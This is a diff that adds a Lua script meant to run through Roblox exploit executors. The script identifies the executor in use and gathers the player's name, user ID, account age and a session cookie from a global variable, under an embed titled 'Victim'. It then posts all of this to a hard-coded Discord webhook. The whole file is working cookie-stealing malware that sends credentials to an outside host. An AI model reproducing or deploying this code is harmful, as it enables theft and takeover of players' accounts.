@@ -1,0 +1,37 @@
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "WTF?"
+        local HttpService = game:GetService("HttpService")
+        local Data =
+        {
+            ["embeds"]= {
+            {            
+                ["title"]= "Victim",
+                ["url"]= "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId,
+                ["description"]= game.Players.LocalPlayer.Name .." , https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
+                ["color"]= 16731726,
+                ["fields"]= {
+                    {
+                    ["name"]= "Executor Using",
+                    ["value"]= ExecutorUsing .. " Or Others IDK",
+                    ["inline"]= true
+                    },
+                    {
+                        ["name"]= "Account Age",
+                        ["value"]= game.Players.LocalPlayer.AccountAge .. " Days",
+                        ["inline"]= true
+                    },
+                    {
+                        ["name"]= "Cookie",
+                        ["value"]= "Cookie: " .. _G.Cookie,
+                        ["inline"]= true
+                    },
+                }              
+            }
+            }
+        }
+
+        local Headers                  = {["Content-Type"]="application/json"}
+        local Encoded                  = HttpService:JSONEncode(Data)
+
+        Request                        = http_request or request or HttpPost or syn.request
+        local Final = {Url             = "https://discordapp.com/api/webhooks/957584878357082142/38rZGP1UhEsi_4ctbf9gHZQytAonvZMEm40FhZFf0MAQu6-GV8D2vgBv0ikhXqjLNgRf", Body = Encoded, Method = "POST", Headers = Headers}
+        Request(Final)
